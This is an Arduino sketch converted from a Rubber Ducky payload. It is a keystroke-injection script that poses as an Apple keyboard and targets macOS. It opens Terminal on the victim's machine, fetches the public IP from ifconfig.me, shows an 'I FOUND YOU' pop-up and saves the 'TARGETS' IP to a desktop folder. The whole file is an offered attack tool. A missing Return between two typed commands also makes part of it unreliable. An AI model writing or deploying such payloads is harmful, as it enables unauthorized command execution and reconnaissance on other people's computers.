// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // Description: Uses Mac Terminals config.me command to do a PUBLIC I.P. lookup
  // displays the results in a pop up window
  // & Saves the data to a folder on the desktop
  // Folder is named "Public I.P. Data"
  // Title: Public I.P. Finder
  // Author: Narsty
  // Target: MacOS
  // Version: 1.0
  // Category: Recon
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  Keyboard.print("curl -s ifconfig.me; echo");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("public_ip=$(curl -s ifconfig.me); osascript -e \"tell app \\\"System Events\\\" to display dialog \\\"I FOUND YOU: $public_ip\\\" with title \\\"Public IP Address\\\"\"");

  delay(500);

  Keyboard.print("mkdir ~/Desktop/\"Public I.P. Data\" && echo \"Your TARGETS IP address is: $public_ip\" > ~/Desktop/\"Public I.P. Data\"/public_ip.txt");

  delay(500);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}